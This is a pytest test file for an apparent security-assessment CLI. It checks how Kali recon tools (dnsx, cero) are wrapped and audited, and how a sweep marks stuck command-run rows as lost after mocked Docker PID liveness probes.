    assert "-rl" in err


def test_dnsx_allows_unguarded_extra_args(monkeypatch):
    cli, captured = _patch_dnsx_exec(monkeypatch)

    cli.main(_dnsx_base_argv("-l", "/engagements/x/scans/cands.txt", "--extra-args=-stats"))

    assert captured["cmd"][-1] == "-stats"


def test_cero_input_list_pipes_via_sh_wrapper(monkeypatch):
    """F4 — `kali cero -l <file>` no longer treats the file as a domain literal.
    The wrapper pipes the file to cero on stdin via a `sh -c 'cat ... | cero ...'`
    construction, with the audit row's tool_name still recorded as `cero`."""
    cli = _import("assess.cli")
    kali = _import("assess.lib.kali")

    captured: dict = {}

    def fake_kali_exec(cmd, **kwargs):
        captured["cmd"] = list(cmd)
        captured["kwargs"] = kwargs
        return kali.KaliResult(
            run_id=1,
            status="completed",
            return_code=0,
            stdout_path="/tmp/x.out",
            stderr_path="/tmp/x.err",
            duration_ms=10,
            peak_rss_bytes=None,
            stdout_preview="",
            stderr_preview="",
            timed_out=False,
            partial_results=False,
        )

    mod = _import("assess.commands.kali_cero")
    monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)

    cli.main(
        [
            "kali",
            "cero",
            "-l",
            "/engagements/x/scans/target_cidrs.txt",
            "-p",
            "443,8443,9443",
            "--technique",
            "OSINT",
            "--intent",
            "cero file-input pipe",
            "--probe-kind",
            "fingerprint",
            "--phase",
            "recon",
            "--timeout",
            "600",
        ]
    )
    cmd = captured["cmd"]
    # File-input form lands as `sh -c 'cat <file> | cero ...'`.
    assert cmd[0] == "sh"
    assert cmd[1] == "-c"
    assert "cat /engagements/x/scans/target_cidrs.txt" in cmd[2]
    assert "cero" in cmd[2]
    assert "-p" in cmd[2] and "443,8443,9443" in cmd[2]
    # tool_name is preserved as `cero` for audit / list-command-runs lookups.
    assert captured["kwargs"]["tool_name"] == "cero"


def test_cero_only_domains_toggle_maps_to_dash_d(monkeypatch):
    """F4 — `--only-domains` is the operator-facing name for cero's native `-d`
    toggle (filter results to valid domain names only). argparse must NOT bind
    `-d` directly because cero's `-d` is a toggle, not a target argument."""
    cli = _import("assess.cli")
    kali = _import("assess.lib.kali")

    captured: dict = {}

    def fake_kali_exec(cmd, **kwargs):
        captured["cmd"] = list(cmd)
        return kali.KaliResult(
            run_id=1,
            status="completed",
            return_code=0,
            stdout_path="/tmp/x.out",
            stderr_path="/tmp/x.err",
            duration_ms=10,
            peak_rss_bytes=None,
            stdout_preview="",
            stderr_preview="",
            timed_out=False,
            partial_results=False,
        )

    mod = _import("assess.commands.kali_cero")
    monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)

    cli.main(
        [
            "kali",
            "cero",
            "--target",
            "198.51.100.0/24",
            "--only-domains",
            "--technique",
            "OSINT",
            "--intent",
            "cero only-domains toggle",
            "--probe-kind",
            "fingerprint",
            "--phase",
            "recon",
            "--timeout",
            "600",
        ]
    )
    cmd = captured["cmd"]
    assert cmd[0] == "cero"
    assert "-d" in cmd  # the toggle, not a target
    assert "198.51.100.0/24" in cmd


# ──────────────────────────────────────────────────────────────────────────
# kali sweep-orphans — host-side reconciler for stuck `running` audit rows
# ──────────────────────────────────────────────────────────────────────────


class _FakeSweepClient:
    """Captures GET pages and PATCH calls for the sweep-orphans tests.

    ``rows`` is the list returned by the first ``GET command-runs?...`` page;
    later pages return empty so paging exits cleanly. ``patches`` records each
    finalize call so tests can assert payload shape and call count.
    """

    def __init__(self, rows):
        self._rows = list(rows)
        self.gets: list[str] = []
        self.patches: list[tuple[str, dict]] = []

    def get(self, endpoint):
        self.gets.append(endpoint)
        if len(self.gets) == 1:
            return list(self._rows)
        return []

    def patch(self, endpoint, payload, *, accept_409: bool = False):
        self.patches.append((endpoint, payload))
        return {"id": int(endpoint.split("/")[-1]), "status": payload.get("status")}

    def close(self):
        return None


def _orphan_row(
    *,
    row_id: int,
    age_seconds: int,
    run_uuid: str | None = "abcd1234",
):
    """Build a minimal command-run row with started_at = (now - age_seconds).

    When run_uuid is None, stdout_path is set to a value the regex does NOT
    match — exercising the "pid file unknown" fallback path.
    """
    import datetime as _dt

    started = _dt.datetime.now(_dt.timezone.utc) - _dt.timedelta(seconds=age_seconds)
    started_iso = started.strftime("%Y-%m-%dT%H:%M:%SZ")
    if run_uuid is None:
        stdout_path = "/legacy/no-uuid-here.txt"
    else:
        stdout_path = f"/engagements/x/scans/kali/{run_uuid}.out"
    return {
        "id": row_id,
        "status": "running",
        "started_at": started_iso,
        "stdout_path": stdout_path,
        "stderr_path": stdout_path.replace(".out", ".err").replace(".txt", ".err.txt"),
    }


def _setup_sweep_test(monkeypatch, fake_engagement, rows):
    """Wire load_config, AssessmentClient, and subprocess.run for a sweep run."""
    sweep = _import("assess.commands.kali_sweep_orphans")

    def fake_load_config(_flag):
        return SimpleNamespace(
            base_url="http://127.0.0.1:18000",
            engagement_dir=str(fake_engagement),
            engagement_key=fake_engagement.name,
            agent_root=str(fake_engagement.parent.parent),
            
        )

    monkeypatch.setattr(sweep, "load_config", fake_load_config)
    fake_client = _FakeSweepClient(rows)
    monkeypatch.setattr(sweep, "AssessmentClient", lambda *a, **k: fake_client)
    return sweep, fake_client


def test_sweep_orphans_finalizes_dead_rows_to_lost(monkeypatch, fake_engagement):
    """Happy path — a stuck row whose in-container PID is dead is PATCHed
    to status=lost with ended_at set and return_code=null."""
    rows = [_orphan_row(row_id=42, age_seconds=7200, run_uuid="aaaa1111")]
    sweep, fake_client = _setup_sweep_test(monkeypatch, fake_engagement, rows)

    # PID file is readable, but kill -0 fails — the wrapper recorded a PID
    # whose process has since exited.
    def fake_subprocess_run(argv, **kwargs):
        if argv[:3] == ["docker", "exec", "security-research"] and argv[3] == "cat":
            return SimpleNamespace(returncode=0, stdout="9999\n", stderr="")
        if argv[:3] == ["docker", "exec", "security-research"] and argv[3] == "kill":
            assert argv[4] == "-0"
            assert argv[5] == "9999"
            return SimpleNamespace(returncode=1, stdout="", stderr="")
        raise AssertionError(f"unexpected subprocess call: {argv}")

    monkeypatch.setattr(sweep.subprocess, "run", fake_subprocess_run)

    sweep.run(SimpleNamespace(
        engagement_dir=str(fake_engagement),
        max_age_seconds=3600,
        container_name="security-research",
        dry_run=False,
    ))

    assert len(fake_client.patches) == 1
    endpoint, payload = fake_client.patches[0]
    assert endpoint == "command-runs/42"
    assert payload["status"] == "lost"
    assert payload["return_code"] is None
    assert payload["ended_at"]
    assert payload["timed_out"] is False


def test_sweep_orphans_skips_alive_rows(monkeypatch, fake_engagement):
    """A stuck-but-alive row stays running — kill -0 returning 0 means the
    process is still going, so the sweep does not PATCH it."""
    rows = [_orphan_row(row_id=7, age_seconds=7200, run_uuid="bbbb2222")]
    sweep, fake_client = _setup_sweep_test(monkeypatch, fake_engagement, rows)

    def fake_subprocess_run(argv, **kwargs):
        if argv[3] == "cat":
            return SimpleNamespace(returncode=0, stdout="12345\n", stderr="")
        if argv[3] == "kill":
            # kill -0 succeeds → process is alive
            return SimpleNamespace(returncode=0, stdout="", stderr="")
        raise AssertionError(f"unexpected subprocess call: {argv}")

    monkeypatch.setattr(sweep.subprocess, "run", fake_subprocess_run)

    sweep.run(SimpleNamespace(
        engagement_dir=str(fake_engagement),
        max_age_seconds=3600,
        container_name="security-research",
        dry_run=False,
    ))

    # No PATCH issued because the row was still-running.
    assert fake_client.patches == []


def test_sweep_orphans_dry_run_does_not_patch(monkeypatch, capsys, fake_engagement):
    """--dry-run lists candidates and the planned action but never PATCHes,
    even when the row would otherwise be finalized.

    Also asserts the per-row decision logic does not print ``would-finalize``
    for rows whose status is already terminal (ISSUE-004): those rows must
    print ``would-skip`` because they would never be finalized by a non-dry
    sweep either.
    """
    rows = [
        _orphan_row(row_id=99, age_seconds=7200, run_uuid="cccc3333"),
        # A row already in a terminal state — must not produce a misleading
        # ``would-finalize`` line; the sweep would skip it on a real run.
        {
            **_orphan_row(row_id=42, age_seconds=7200, run_uuid="dddd4444"),
            "status": "completed",
        },
    ]
    sweep, fake_client = _setup_sweep_test(monkeypatch, fake_engagement, rows)

    def fake_subprocess_run(argv, **kwargs):
        if argv[3] == "cat":
            return SimpleNamespace(returncode=0, stdout="500\n", stderr="")
        if argv[3] == "kill":
            return SimpleNamespace(returncode=1, stdout="", stderr="")
        raise AssertionError(f"unexpected subprocess call: {argv}")

    monkeypatch.setattr(sweep.subprocess, "run", fake_subprocess_run)

    sweep.run(SimpleNamespace(
        engagement_dir=str(fake_engagement),
        max_age_seconds=3600,
        container_name="security-research",
        dry_run=True,
    ))

    # Dry-run never writes — finalize PATCH must not be issued.
    assert fake_client.patches == []

    out = capsys.readouterr().out
    # The running-status row gets a would-finalize line; the terminal row
    # must NOT — that lie is exactly the bug ISSUE-004 documented.
    assert "would-finalize id=99" in out
    assert "would-finalize id=42" not in out
    # Terminal rows surface as a would-skip line so the operator can see
    # why the sweep declined to act.
    assert "would-skip id=42" in out
    assert "reason=already-terminal" in out


def test_sweep_orphans_filters_to_running_status_serverside(
    monkeypatch, fake_engagement
):
    """The GET request must include ``status=running`` so the backend can
    serve only the in-flight rows once it grows server-side filtering.

    Until the backend supports the filter, the CLI also applies the same
    filter client-side (covered by ``test_sweep_orphans_dry_run_does_not_patch``);
    sending the query param now keeps the cutover painless when the backend
    catches up.
    """
    rows = [_orphan_row(row_id=1, age_seconds=7200, run_uuid="eeee5555")]
    sweep, fake_client = _setup_sweep_test(monkeypatch, fake_engagement, rows)

    def fake_subprocess_run(argv, **kwargs):
        if argv[3] == "cat":
            return SimpleNamespace(returncode=0, stdout="100\n", stderr="")
        if argv[3] == "kill":
            return SimpleNamespace(returncode=1, stdout="", stderr="")
        raise AssertionError(f"unexpected subprocess call: {argv}")

    monkeypatch.setattr(sweep.subprocess, "run", fake_subprocess_run)

    sweep.run(SimpleNamespace(
        engagement_dir=str(fake_engagement),
        max_age_seconds=3600,
        container_name="security-research",
        dry_run=True,
    ))

    # The first GET must scope to status=running so the backend can short-
    # circuit the scan once it supports the filter.
    assert fake_client.gets, "expected at least one GET against command-runs"
    first = fake_client.gets[0]
    assert first.startswith("command-runs?")
    assert "status=running" in first


def test_sweep_orphans_handles_missing_pid_file_as_dead(monkeypatch, fake_engagement):
    """A row whose in-container pid file is missing (cat returncode != 0) is
    treated as dead and finalized to status=lost. Same outcome when the
    stdout_path does not match the run_uuid pattern at all (legacy layout)."""
    rows = [
        _orphan_row(row_id=11, age_seconds=7200, run_uuid="dddd4444"),
        _orphan_row(row_id=12, age_seconds=7200, run_uuid=None),
    ]
    sweep, fake_client = _setup_sweep_test(monkeypatch, fake_engagement, rows)

    def fake_subprocess_run(argv, **kwargs):
        # Pid file missing — cat returns non-zero with empty stdout.
        if argv[3] == "cat":
            return SimpleNamespace(returncode=1, stdout="", stderr="No such file")
        # kill -0 should NOT be called when the pid is unknown — but harden
        # the test against future refactors by treating it as dead anyway.
        if argv[3] == "kill":
            return SimpleNamespace(returncode=1, stdout="", stderr="")
        raise AssertionError(f"unexpected subprocess call: {argv}")

    monkeypatch.setattr(sweep.subprocess, "run", fake_subprocess_run)

    sweep.run(SimpleNamespace(
        engagement_dir=str(fake_engagement),
        max_age_seconds=3600,
        container_name="security-research",
        dry_run=False,
    ))

    # Both rows finalized to lost.
    assert {endpoint for endpoint, _ in fake_client.patches} == {
        "command-runs/11",
        "command-runs/12",
    }
    for _, payload in fake_client.patches:
        assert payload["status"] == "lost"
        assert payload["return_code"] is None


def test_sweep_orphans_skips_when_pid_probe_fails(
    monkeypatch, fake_engagement, capsys
):
    """Docker probe failures mean liveness is unknown; do not finalize the
    command-run as lost based on an unavailable liveness check."""
    rows = [_orphan_row(row_id=13, age_seconds=7200, run_uuid="dddd5555")]
    sweep, fake_client = _setup_sweep_test(monkeypatch, fake_engagement, rows)

    def fake_subprocess_run(argv, **kwargs):
        if argv[3] == "cat":
            raise subprocess.TimeoutExpired(cmd=argv, timeout=kwargs.get("timeout"))
        raise AssertionError(f"unexpected subprocess call: {argv}")

    monkeypatch.setattr(sweep.subprocess, "run", fake_subprocess_run)

    sweep.run(SimpleNamespace(
        engagement_dir=str(fake_engagement),
        max_age_seconds=3600,
        container_name="security-research",
        dry_run=False,
    ))

    assert fake_client.patches == []
    out = capsys.readouterr().out
    assert "skipped id=13" in out
    assert "pid-probe-failed" in out


def test_sweep_orphans_skips_when_liveness_probe_fails(
    monkeypatch, fake_engagement, capsys
):
    """A readable pid file is not enough to mark lost when kill -0 cannot
    complete because Docker probing failed."""
    rows = [_orphan_row(row_id=14, age_seconds=7200, run_uuid="eeee6666")]
    sweep, fake_client = _setup_sweep_test(monkeypatch, fake_engagement, rows)

    def fake_subprocess_run(argv, **kwargs):
        if argv[3] == "cat":
            return SimpleNamespace(returncode=0, stdout="12345\n", stderr="")
        if argv[3] == "kill":
            raise FileNotFoundError("docker")
        raise AssertionError(f"unexpected subprocess call: {argv}")

    monkeypatch.setattr(sweep.subprocess, "run", fake_subprocess_run)

    sweep.run(SimpleNamespace(
        engagement_dir=str(fake_engagement),
        max_age_seconds=3600,
        container_name="security-research",
        dry_run=False,
    ))

    assert fake_client.patches == []
    out = capsys.readouterr().out
    assert "skipped id=14" in out
    assert "liveness-probe-failed" in out


def test_sweep_orphans_uses_db_run_uuid_when_present(monkeypatch, fake_engagement):
    """P1 schema fix: ``run_uuid`` is the DB column on assessment_command_runs;
    sweep-orphans must prefer that column over parsing the stdout_path regex.
    The regex is kept only as a fallback for legacy rows pre-plumbing.

    Set up a row where the DB column carries one uuid and stdout_path carries
    a DIFFERENT uuid (simulating a custom artifact dir or legacy layout) — the
    sweep must lookup the pid file using the DB-column value.
    """
    db_uuid = "ffff9999"
    legacy_path_uuid = "0000aaaa"  # what the regex would have returned
    row = _orphan_row(row_id=42, age_seconds=7200, run_uuid=legacy_path_uuid)
    row["run_uuid"] = db_uuid  # canonical source — this is what sweep should use
    rows = [row]
    sweep, fake_client = _setup_sweep_test(monkeypatch, fake_engagement, rows)

    cat_args: list[str] = []

    def fake_subprocess_run(argv, **kwargs):
        if argv[3] == "cat":
            cat_args.append(argv[-1])
            # Pid file missing — return non-zero to skip kill -0 and finalize as lost.
            return SimpleNamespace(returncode=1, stdout="", stderr="No such file")
        if argv[3] == "kill":
            return SimpleNamespace(returncode=1, stdout="", stderr="")
        raise AssertionError(f"unexpected subprocess call: {argv}")

    monkeypatch.setattr(sweep.subprocess, "run", fake_subprocess_run)

    sweep.run(SimpleNamespace(
        engagement_dir=str(fake_engagement),
        max_age_seconds=3600,
        container_name="security-research",
        dry_run=False,
    ))

    # The cat call must have asked for the DB-column uuid's pid file, not the
    # legacy regex value. This is the load-bearing assertion of the P1 fix.
    assert cat_args, "sweep must look up at least one pid file"
    assert cat_args[0] == f"/tmp/aith-pid-{db_uuid}.pid"
    assert legacy_path_uuid not in cat_args[0]


def test_sweep_orphans_respects_max_age_threshold(monkeypatch, fake_engagement):
    """A row that is younger than --max-age-seconds is NOT a candidate even
    when its status is running — newly-started rows must not be reaped just
    because a sweep happens to run mid-flight."""
    rows = [_orphan_row(row_id=1, age_seconds=60, run_uuid="eeee5555")]
    sweep, fake_client = _setup_sweep_test(monkeypatch, fake_engagement, rows)

    calls = {"count": 0}

    def fake_subprocess_run(argv, **kwargs):
        calls["count"] += 1
        # Should never be called — the row is too fresh to be a candidate.
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr(sweep.subprocess, "run", fake_subprocess_run)

    sweep.run(SimpleNamespace(
        engagement_dir=str(fake_engagement),
        max_age_seconds=3600,
        container_name="security-research",
        dry_run=False,
    ))

    # No subprocess call (no liveness probe) and no PATCH because the row
    # was below the threshold.
    assert calls["count"] == 0
    assert fake_client.patches == []


def test_read_safely_seeks_to_end_for_true_tail(tmp_path):
    """ISSUE-007: ``_read_safely`` must seek to the file end when the file
    is larger than max_bytes.

    The previous implementation read ``max_bytes + 1`` bytes from the START
    and treated the second half as "tail" — meaning for files >32K the "tail"
    was actually bytes 16K-32K rather than the actual last bytes of the
    file. Operators investigating a long-running scan saw the same head as
    the tail, missing every late-process error message.
    """
    kali = _import("assess.lib.kali")
    path = tmp_path / "long.out"
    # ~100KB of marker lines; tail must contain late lines (e.g. line 099XXX)
    # while early lines (line 000500) must NOT appear in the tail half.
    line_count = 5000
    text = "".join(f"line {i:06d}: padding aaaa bbbb cccc\n" for i in range(line_count))
    path.write_text(text, encoding="utf-8")
    assert path.stat().st_size > 32_768  # precondition for the bug

    preview = kali._read_safely(path)
    last_line_marker = f"line {line_count - 1:06d}"
    assert last_line_marker in preview, (
        f"_read_safely must include the actual end of the file; missing {last_line_marker!r}"
    )
    # The tail half must reach the actual end. We also assert the preview
    # contains the truncation banner so the operator knows bytes were elided.
    assert "[truncated" in preview
    assert "from middle of" in preview
    # An early line that is NOT in the head budget (16K) should not appear.
    # Each line is ~30 bytes; 16K / 30 ~= 545 lines, so line 000800 is past
    # the head budget but well before the tail half — it must not be in the
    # preview at all.
    assert "line 000800" not in preview, (
        "_read_safely must not include the middle of the file (only head + tail)"
    )
